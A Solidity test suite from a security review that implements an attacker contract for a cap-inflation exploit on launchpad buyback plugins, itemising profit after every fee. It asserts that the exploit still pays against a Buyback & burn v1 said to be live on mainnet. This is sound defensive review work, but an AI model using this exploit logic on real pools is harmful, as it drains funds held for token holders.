// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
import {ILaunchPair} from "../../interfaces/ILaunchPair.sol";
import {ILaunchRouter} from "../../interfaces/ILaunchRouter.sol";
import {IArchitexLaunchpad} from "../../interfaces/IArchitexLaunchpad.sol";
import {IDeepenPoolPlugin} from "../../interfaces/plugins/IDeepenPoolPlugin.sol";
import {IBuybackBurnPlugin} from "../../interfaces/plugins/IBuybackBurnPlugin.sol";
import {DeepenReviewBase} from "./DeepenReviewBase.sol";

/// @dev Every USDC the attacker moves, and every fee it pays, in one transaction.
struct Book {
    uint256 usdcStart;
    uint256 usdcEnd;
    uint256 peakCapital; // most USDC out of the attacker's wallet at once
    uint256 buyIn;
    uint256 buyPlatformFee;
    uint256 buyCreatorFee;
    uint256 parkUsdc; // USDC side of the liquidity it parked
    uint256 parkTokens;
    uint256 unparkUsdc;
    uint256 unparkTokens;
    uint256 sellTokens;
    uint256 sellGross;
    uint256 sellPlatformFee;
    uint256 sellCreatorFee;
    uint256 potSpent; // what the plugin's run spent
}

/// @dev The attacker, with a ledger. `attack` is one transaction: [sweep pending creator fees], push the price with
///      a buy, park the bag as liquidity (fee-free: LaunchPair charges nothing on mint or burn), run the plugin,
///      unpark, sell every token. USDC in, USDC out.
contract Settler {
    ILaunchRouter public immutable router;
    ILaunchPair public immutable pair;
    IERC20 public immutable token;
    IERC20 public immutable usdcToken;
    address public immutable plugin;
    IArchitexLaunchpad public immutable pad;

    Book internal _book;

    constructor(address plugin_, address pad_, address router_, address pair_, address token_, address usdc_) {
        plugin = plugin_;
        pad = IArchitexLaunchpad(pad_);
        router = ILaunchRouter(router_);
        pair = ILaunchPair(pair_);
        token = IERC20(token_);
        usdcToken = IERC20(usdc_);
        IERC20(usdc_).approve(router_, type(uint256).max);
    }

    function book() external view returns (Book memory) {
        return _book;
    }

    function _low() internal {
        uint256 bal = usdcToken.balanceOf(address(this));
        uint256 out = _book.usdcStart > bal ? _book.usdcStart - bal : 0;
        if (out > _book.peakCapital) _book.peakCapital = out;
    }

    /// @param buyUsdc the price push (0 = none)
    /// @param park whether to park the bag as liquidity across the run
    /// @param withRun false = the control trip
    /// @param sweep call the launchpad's permissionless collectCreatorFees first
    function attack(uint256 buyUsdc, bool park, bool withRun, bool sweep) external returns (int256 pnl) {
        delete _book;
        _book.usdcStart = usdcToken.balanceOf(address(this));
        if (sweep) pad.collectCreatorFees(address(token));

        if (buyUsdc != 0) {
            (, uint256 pf, uint256 cf) = router.quoteBuy(address(token), buyUsdc);
            router.buy(address(token), buyUsdc, 0, address(this), block.timestamp);
            (_book.buyIn, _book.buyPlatformFee, _book.buyCreatorFee) = (buyUsdc, pf, cf);
            _low();
        }

        uint256 lp;
        if (park) {
            uint256 tk = token.balanceOf(address(this));
            (uint112 rT, uint112 rU,) = pair.getReserves();
            uint256 need = tk * uint256(rU) / uint256(rT);
            token.transfer(address(pair), tk);
            usdcToken.transfer(address(pair), need);
            lp = pair.mint(address(this));
            (_book.parkUsdc, _book.parkTokens) = (need, tk);
            _low();
        }

        if (withRun) {
            uint256 heldBefore = _held();
            (bool ok, bytes memory err) = plugin.call(abi.encodeWithSignature("run(address)", address(token)));
            if (!ok) {
                assembly {
                    revert(add(err, 32), mload(err))
                }
            }
            _book.potSpent = heldBefore - _held();
        }

        if (lp != 0) {
            uint256 u0 = usdcToken.balanceOf(address(this));
            uint256 t0 = token.balanceOf(address(this));
            IERC20(address(pair)).transfer(address(pair), lp);
            pair.burn(address(this));
            _book.unparkUsdc = usdcToken.balanceOf(address(this)) - u0;
            _book.unparkTokens = token.balanceOf(address(this)) - t0;
        }

        uint256 left = token.balanceOf(address(this));
        if (left != 0) {
            (uint256 out, uint256 pf, uint256 cf) = router.quoteSell(address(token), left);
            router.sell(address(token), left, 0, address(this), block.timestamp);
            (_book.sellTokens, _book.sellGross, _book.sellPlatformFee, _book.sellCreatorFee) =
                (left, out + pf + cf, pf, cf);
        }
        _book.usdcEnd = usdcToken.balanceOf(address(this));
        pnl = int256(_book.usdcEnd) - int256(_book.usdcStart);
        require(token.balanceOf(address(this)) == 0, "attacker ends holding no token");
        require(IERC20(address(pair)).balanceOf(address(this)) == 0, "attacker ends holding no LP");
    }

    function _held() internal view returns (uint256 h) {
        (, bytes memory ret) = plugin.staticcall(abi.encodeWithSignature("usdcHeld(address)", address(token)));
        h = abi.decode(ret, (uint256));
    }
}

/// @notice Settles the cap-inflation finding (round-5 review, H1) with numbers: P&L after every fee, the capital, the
///         hold, and whether the attacker needs to be the only caller.
///
///         Deepen pool now sizes its cap from the LOCKED part of the pool's USDC reserve (the share owned by LP at
///         0x…dEaD), which parking liquidity cannot move, and these tests hold it to a loss everywhere.
///
///         Buyback & burn v1, live on Arc mainnet (byte-identical per V13-MAINNET.md; CAP_BPS 25, RUN_INTERVAL 3600,
///         MIN_RUN_USDC 3 read back from chain), still sizes its cap from the whole reserve and stays exploitable:
///         its tests assert the attack PAYS, so it cannot quietly be listed again. The builder has paused it.
contract CapInflationSettleTest is DeepenReviewBase {
    address internal token;
    Settler internal atk;
    bool internal isDeepen;

    // ─── Fixture ──────────────────────────────────────────────────────────────

    /// @dev A graduated token (the standard 25,000 USDC pool) whose fees go to `plugin`, nothing else trading.
    function _token(bool deepen_, uint16 c) internal {
        isDeepen = deepen_;
        address plugin = deepen_ ? address(deepen) : address(buyback);
        vm.prank(alice);
        token = pad.createToken(
            "Target", "TGT", "", c, plugin, deepen_ ? abi.encode(uint16(5_000)) : bytes(""), 0, 0, type(uint256).max
        );
        _graduate(token);
        atk = new Settler(plugin, address(pad), address(router), pad.pairOf(token), token, address(usdc));
        usdc.mint(address(atk), 10_000_000_000e6);
    }

    function _pot(uint256 amount) internal {
        if (isDeepen) _topUp(token, amount);
        else _topUpBuyback(token, amount);
    }

    function _honestOffer() internal view returns (uint256 offer) {
        if (isDeepen) (offer,,,) = deepen.previewRun(token);
        else (offer,) = buyback.previewRun(token);
    }

    /// @dev The push that just lets one run's cap cover `pot`: a full park after a push of net b leaves the pool's USDC
    ///      reserve at about (R + b)^2 / R, and the cap is 0.25% of that, so b = sqrt(400 * pot * R) - R.
    function _pushFor(uint256 pot, uint16 c) internal view returns (uint256 buyUsdc) {
        (, uint256 r) = _reserves(token);
        uint256 root = Math.sqrt(400 * pot * r);
        if (root <= r) return 0;
        uint256 b = root - r;
        buyUsdc = b * 10_000 / (10_000 - 50 - uint256(c)) + 2;
    }

    function _logBook(string memory label, Book memory b, int256 pnl) internal {
        emit log(label);
        emit log_named_uint("  pot spent by the run       ", b.potSpent);
        emit log_named_uint("  push (router buy)          ", b.buyIn);
        emit log_named_uint("  park, USDC side            ", b.parkUsdc);
        emit log_named_uint("  peak capital in one tx     ", b.peakCapital);
        emit log_named_uint("  fees: buy platform         ", b.buyPlatformFee);
        emit log_named_uint("  fees: buy creator          ", b.buyCreatorFee);
        emit log_named_uint("  fees: sell platform        ", b.sellPlatformFee);
        emit log_named_uint("  fees: sell creator         ", b.sellCreatorFee);
        emit log_named_uint("  fees: LP mint + burn       ", 0);
        emit log_named_uint("  fees: total paid           ",
            b.buyPlatformFee + b.buyCreatorFee + b.sellPlatformFee + b.sellCreatorFee);
        emit log_named_int("  NET P&L (USDC out - in)    ", pnl);
    }

    // ═════════════════════════════════════════════════════════════════════════
    // S1/S2. The headline attack, fully itemised, Deepen pool and live Buyback & burn
    // ═════════════════════════════════════════════════════════════════════════

    function _headline(bool deepen_) internal {
        uint16 c = 100; // a 1% creator fee: the table says 7.2 h (Deepen, default share) / 5.1 h (Buyback)
        _token(deepen_, c);
        _pot(200_000e6);
        _step(HOUR);
        uint256 honest = _honestOffer();
        uint256 buyUsdc = _pushFor(200_000e6, c);

        uint256 snap = vm.snapshotState();
        int256 control = atk.attack(buyUsdc, true, false, false);
        Book memory cb = atk.book();
        vm.revertToState(snap);

        uint256 snap2 = vm.snapshotState();
        atk.attack(buyUsdc, false, true, false);
        uint256 pushOnlySpent = atk.book().potSpent;
        vm.revertToState(snap2);

        int256 pnl = atk.attack(buyUsdc, true, true, false);
        Book memory b = atk.book();

        emit log_named_uint("honest offer (0.25% of the locked pool)", honest);
        _logBook("CONTROL: the same trip, no run", cb, control);
        _logBook("ATTACK: push, park, run, unpark, sell (one tx, zero blocks held)", b, pnl);
        emit log_named_uint("the same push, no park: pot spent", pushOnlySpent);
        assertEq(cb.potSpent, 0);
        assertLt(control, 0, "the round trip alone always loses");
        if (deepen_) {
            assertApproxEqAbs(b.potSpent, pushOnlySpent, 1, "parking the bag adds nothing to what the run spends");
            assertLt(pnl, 0, "and the attack loses, after every fee");
        } else {
            assertGt(b.potSpent, honest * 3_000, "v1: one run spent over 3,000 honest caps");
            assertGt(pnl, 0, "v1: and the attacker is up, after every fee");
        }
    }

    function test_S1_deepen_itemised_loses() public {
        _headline(true);
    }

    function test_S2_liveBuybackBurnV1_itemised_stillPays() public {
        _headline(false);
    }

    // ═════════════════════════════════════════════════════════════════════════
    // S3. From what pot size does it pay? Every creator fee, both plugins.
    // ═════════════════════════════════════════════════════════════════════════

    /// @dev Best of a few pushes around the one that just drains the pot.
    function _best(uint256 pot, uint16 c) internal returns (int256 best, uint256 bestCapital, uint256 bestSpent) {
        best = type(int256).min;
        uint256 base = _pushFor(pot, c);
        uint16[5] memory mults = [uint16(60), 80, 100, 125, 160];
        for (uint256 m; m < mults.length; ++m) {
            uint256 buyUsdc = base * mults[m] / 100;
            if (buyUsdc < 1e6) buyUsdc = 1e6;
            uint256 snap = vm.snapshotState();
            int256 pnl = atk.attack(buyUsdc, true, true, false);
            Book memory b = atk.book();
            vm.revertToState(snap);
            if (pnl > best) (best, bestCapital, bestSpent) = (pnl, b.peakCapital, b.potSpent);
        }
    }

    function _thresholds(bool deepen_) internal {
        uint16[6] memory fees = [uint16(0), 50, 100, 250, 500, 1000];
        uint256[14] memory pots = [
            uint256(250e6),
            500e6,
            1_000e6,
            2_000e6,
            3_000e6,
            5_000e6,
            7_500e6,
            10_000e6,
            15_000e6,
            25_000e6,
            50_000e6,
            100_000e6,
            250_000e6,
            1_000_000e6
        ];
        for (uint256 f; f < fees.length; ++f) {
            uint256 snap0 = vm.snapshotState();
            _token(deepen_, fees[f]);
            emit log_named_uint(deepen_ ? "DEEPEN  creatorFeeBps" : "BUYBACK creatorFeeBps", fees[f]);
            uint256 firstProfitable;
            for (uint256 p; p < pots.length; ++p) {
                uint256 snap1 = vm.snapshotState();
                _pot(pots[p]);
                _step(HOUR);
                (int256 best, uint256 cap_, uint256 spent) = _best(pots[p], fees[f]);
                vm.revertToState(snap1);
                if (best > 0 && firstProfitable == 0) firstProfitable = pots[p];
                if (deepen_) assertLt(best, 0, "Deepen: no pot, no creator fee, no push pays");
                if (p == 0 || best > 0 || pots[p] >= 10_000e6) {
                    emit log_named_uint("    pot                 ", pots[p]);
                    emit log_named_uint("      pot spent in 1 tx ", spent);
                    emit log_named_uint("      capital (1 tx)    ", cap_);
                    emit log_named_int("      best net P&L      ", best);
                }
            }
            emit log_named_uint("  => smallest profitable pot in this grid", firstProfitable);
            if (!deepen_ && fees[f] == 0) assertGt(firstProfitable, 0, "v1: some pot in the grid pays");
            vm.revertToState(snap0);
        }
    }

    function test_S3a_deepen_noPotPays() public {
        _thresholds(true);
    }

    function test_S3b_liveBuybackBurnV1_thresholdByCreatorFee() public {
        _thresholds(false);
    }

    // ═════════════════════════════════════════════════════════════════════════
    // S4. Does it need to be the only caller? Honest runs shortly before.
    // ═════════════════════════════════════════════════════════════════════════

    /// @dev A keeper ran `ago` seconds before the attack. The budget is then inflatedCap * ago / 3600, so the
    ///      attacker must inflate 3600/ago times further to take the same pot. Pot 200,000, 1% creator fee.
    function _keeper(bool deepen_) internal {
        uint256[6] memory agos = [uint256(1), 12, 60, 300, 900, 3600];
        for (uint256 i; i < agos.length; ++i) {
            uint256 snap = vm.snapshotState();
            _token(deepen_, 100);
            _pot(200_000e6);
            _step(HOUR);
            vm.prank(keeper);
            (bool ok,) = (deepen_ ? address(deepen) : address(buyback)).call(
                abi.encodeWithSignature("run(address)", token)
            );
            require(ok, "keeper run");
            _step(agos[i]);
            uint256 pot = deepen_ ? deepen.usdcHeld(token) : buyback.usdcHeld(token);
            // Push for the pot scaled by 3600/ago, the inflation now needed to cover it in one run.
            uint256 needPot = pot * 3600 / agos[i];
            int256 best = type(int256).min;
            uint256 bestCap;
            uint256 bestSpent;
            uint256 base = _pushFor(needPot, 100);
            uint16[6] memory mults = [uint16(5), 12, 25, 50, 100, 150];
            uint256 feasible;
            for (uint256 m; m < mults.length; ++m) {
                uint256 s2 = vm.snapshotState();
                // The attacker holds 10 billion USDC; anything needing more is out of reach and is skipped.
                try atk.attack(base * mults[m] / 100 + 1e6, true, true, false) returns (int256 pnl) {
                    Book memory b = atk.book();
                    ++feasible;
                    if (pnl > best) (best, bestCap, bestSpent) = (pnl, b.peakCapital, b.potSpent);
                } catch {}
                vm.revertToState(s2);
            }
            emit log_named_uint(deepen_ ? "DEEPEN  seconds since an honest run" : "BUYBACK seconds since an honest run", agos[i]);
            emit log_named_uint("    park needed to drain the pot in 1 tx (~400 x pot x 3600/ago)", needPot * 400);
            if (deepen_ && feasible != 0) assertLt(best, 0, "Deepen: loses whenever the last run was");
            if (feasible == 0) {
                emit log("    every push tried needs more than 10 billion USDC: out of reach");
            } else {
                emit log_named_uint("    pot spent in 1 tx", bestSpent);
                emit log_named_uint("    capital (1 tx)   ", bestCap);
                emit log_named_int("    best net P&L     ", best);
            }
            vm.revertToState(snap);
        }
    }

    function test_S4a_deepen_keeperRanRecently_loses() public {
        _keeper(true);
    }

    function test_S4b_liveBuybackBurn_keeperRanRecently() public {
        _keeper(false);
    }

    /// @dev A keeper's run earlier in the SAME block: the attacker's run reverts AlreadyRanThisBlock and, since it is
    ///      one transaction, everything it did unwinds. It loses gas only, and tries again next block.
    function test_S5_sameBlockKeeperOnlyCostsTheAttackerGas() public {
        _token(true, 100);
        _pot(200_000e6);
        _step(HOUR);
        vm.prank(keeper);
        deepen.run(token);
        uint256 before = usdc.balanceOf(address(atk));
        uint256 push = _pushFor(200_000e6, 100); // evaluated first: expectRevert binds to the next external call
        vm.expectRevert(abi.encodeWithSelector(IDeepenPoolPlugin.AlreadyRanThisBlock.selector, token));
        atk.attack(push, true, true, false);
        assertEq(usdc.balanceOf(address(atk)), before, "the reverted attempt cost nothing but gas");
    }

    // ═════════════════════════════════════════════════════════════════════════
    // S7. Which lever does the work? Each one alone, USDC in to USDC out.
    // ═════════════════════════════════════════════════════════════════════════

    /// @dev Pot 200,000, 1% creator fee. (a) push only: buy, run, sell. (b) park only: tokens bought on the CURVE
    ///      before graduation (so this pool's price is untouched), parked across the run, then sold, compared with
    ///      the same bag sold with no run. (c) donate USDC into the pair and sync (raises the reserve with no LP),
    ///      run, sell a bag. (d) push + park, the attack.
    function test_S7_eachLeverAlone() public {
        uint256 push = 0;
        // (a) push only, at several sizes
        uint256[4] memory sizes = [uint256(100_000e6), 1_410_369e6, 10_000_000e6, 50_000_000e6];
        for (uint256 i; i < sizes.length; ++i) {
            uint256 snap = vm.snapshotState();
            _token(true, 100);
            _pot(200_000e6);
            _step(HOUR);
            int256 pnl = atk.attack(sizes[i], false, true, false);
            Book memory b = atk.book();
            emit log_named_uint("(a) push only, buy", sizes[i]);
            emit log_named_uint("      pot spent   ", b.potSpent);
            emit log_named_int("      net P&L     ", pnl);
            assertLt(pnl, 0, "a price push without the park never pays");
            vm.revertToState(snap);
        }

        // (b) park only: the attacker's bag comes from the curve, before graduation.
        {
            uint256 snap = vm.snapshotState();
            isDeepen = true;
            vm.prank(alice);
            token = pad.createToken("Target", "TGT", "", 100, address(deepen), abi.encode(uint16(5_000)), 0, 0, type(uint256).max);
            atk = new Settler(address(deepen), address(pad), address(router), pad.pairOf(token), token, address(usdc));
            usdc.mint(address(atk), 10_000_000_000e6);
            vm.prank(carol);
            pad.buy(token, 10_000e6, 0, address(atk), type(uint256).max); // an early curve bag, given to the attacker
            _graduate(token);
            _pot(200_000e6);
            _step(HOUR);
            (uint256 honestOffer,,,) = deepen.previewRun(token);
            uint256 s2 = vm.snapshotState();
            int256 withRun = atk.attack(push, true, true, false);
            Book memory b = atk.book();
            vm.revertToState(s2);
            int256 noRun = atk.attack(push, true, false, false);
            // The add can leave up to 4 units of an offer for the next run (V13-SPEC §2.3), hence the tolerance.
            assertLe(b.potSpent, honestOffer, "(b) the parked bag leaves the run at the honest offer");
            assertApproxEqAbs(b.potSpent, honestOffer, 4, "(b) the parked bag leaves the run at the honest offer");
            emit log_named_uint("(b) park only: bag parked, tokens", b.parkTokens);
            emit log_named_uint("      park USDC side             ", b.parkUsdc);
            emit log_named_uint("      pot spent                  ", b.potSpent);
            emit log_named_int("      USDC out, with the run     ", withRun);
            emit log_named_int("      USDC out, no run           ", noRun);
            emit log_named_int("      what the run added         ", withRun - noRun);
            vm.revertToState(snap);
        }

        // (c) donate + sync
        {
            uint256 snap = vm.snapshotState();
            _token(true, 100);
            _pot(200_000e6);
            _step(HOUR);
            address pair = pad.pairOf(token);
            uint256 before = usdc.balanceOf(griefer);
            vm.startPrank(griefer);
            uint256 got = router.buy(token, 1_000_000e6, 0, griefer, block.timestamp);
            usdc.transfer(pair, 20_000_000e6);
            ILaunchPair(pair).sync();
            vm.stopPrank();
            uint256 held0 = deepen.usdcHeld(token);
            vm.prank(griefer);
            deepen.run(token);
            uint256 spent = held0 - deepen.usdcHeld(token);
            vm.prank(griefer);
            router.sell(token, got, 0, griefer, block.timestamp);
            int256 pnl = int256(usdc.balanceOf(griefer)) - int256(before);
            emit log_named_uint("(c) donate 20M + sync, pot spent", spent);
            emit log_named_int("      net P&L                    ", pnl);
            assertLt(pnl, 0, "gifting the pool the reserve is not a cheap lever");
            vm.revertToState(snap);
        }
    }

    // ═════════════════════════════════════════════════════════════════════════
    // S8. Before graduation: no pool to park in, so only the (fee-paying) push is left
    // ═════════════════════════════════════════════════════════════════════════

    function test_S8_onTheCurveTheAttackHasNoLever() public {
        bool[2] memory which = [true, false];
        uint256[4] memory pushes = [uint256(1_000e6), 5_000e6, 10_000e6, 20_000e6]; // all short of selling out
        for (uint256 w; w < 2; ++w) {
            for (uint256 i; i < pushes.length; ++i) {
                uint256 snap = vm.snapshotState();
                address plugin = which[w] ? address(deepen) : address(buyback);
                vm.prank(alice);
                token = pad.createToken(
                    "Curve", "CRV", "", 100, plugin, which[w] ? abi.encode(uint16(5_000)) : bytes(""), 0, 0, type(uint256).max
                );
                isDeepen = which[w];
                _pot(200_000e6);
                _step(HOUR);
                uint256 before = usdc.balanceOf(mallory);
                vm.prank(mallory);
                (uint256 got,) = pad.buy(token, pushes[i], 0, mallory, type(uint256).max);
                uint256 held0 = which[w] ? deepen.usdcHeld(token) : buyback.usdcHeld(token);
                vm.prank(mallory);
                (bool ok,) = plugin.call(abi.encodeWithSignature("run(address)", token));
                require(ok, "run");
                uint256 spent = held0 - (which[w] ? deepen.usdcHeld(token) : buyback.usdcHeld(token));
                assertFalse(pad.isGraduated(token), "still on the curve");
                vm.prank(mallory);
                pad.sell(token, got, 0, mallory, type(uint256).max);
                int256 pnl = int256(usdc.balanceOf(mallory)) - int256(before);
                emit log_named_uint(which[w] ? "CURVE deepen  push" : "CURVE buyback push", pushes[i]);
                emit log_named_uint("      pot spent", spent);
                emit log_named_int("      net P&L  ", pnl);
                assertLt(pnl, 0, "on the curve the push alone never pays");
                assertLe(spent, 100e6, "and a curve run is at most ~0.25% of ~33,333 virtual USDC");
                vm.revertToState(snap);
            }
        }
    }

    // ═════════════════════════════════════════════════════════════════════════
    // S6. Pending creator fees are part of the target
    // ═════════════════════════════════════════════════════════════════════════

    /// @dev Fees sitting in the launchpad count too: the attacker sweeps them into the pot in the same transaction.
    ///      With the locked base the sweep only fills the pot; the run still spends one locked cap, and loses.
    function test_S6_sweepingPendingCreatorFeesDoesNotPay() public {
        _token(true, 500);
        // Organic volume leaves 5% creator fees pending in the launchpad (nobody collected).
        for (uint256 i; i < 20; ++i) {
            vm.startPrank(carol);
            uint256 got = router.buy(token, 200_000e6, 0, carol, block.timestamp);
            router.sell(token, got, 0, carol, block.timestamp);
            vm.stopPrank();
        }
        uint256 pending = pad.pendingCreatorFees(token);
        _step(HOUR);
        assertEq(deepen.usdcHeld(token), 0, "the pot itself is empty");
        int256 pnl = atk.attack(_pushFor(pending, 500), true, true, true);
        Book memory b = atk.book();
        emit log_named_uint("creator fees pending in the launchpad", pending);
        emit log_named_uint("pot spent after the sweep            ", b.potSpent);
        emit log_named_int("net P&L                              ", pnl);
        assertLt(b.potSpent, pending / 10, "one run spends a small part of the swept fees");
        assertLt(pnl, 0, "and the attack loses");
    }
}
